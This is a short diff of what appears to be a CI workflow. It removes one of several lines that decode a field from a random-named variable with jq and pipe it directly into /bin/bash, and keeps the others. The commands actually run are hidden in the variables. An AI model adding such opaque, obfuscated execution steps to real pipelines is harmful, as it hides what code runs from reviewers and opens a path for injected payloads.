@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$szkk20866" | jq -r .bmo11 | /bin/bash
           echo $bi3825 | jq -r .eo95149 | /bin/bash
-          echo $tj4 | jq -r .hryg95 | /bin/bash
           echo $lfrag69 | jq -r .pt1806 | /bin/bash
           echo $dsc33088 | jq -r .m30 | /bin/bash
 
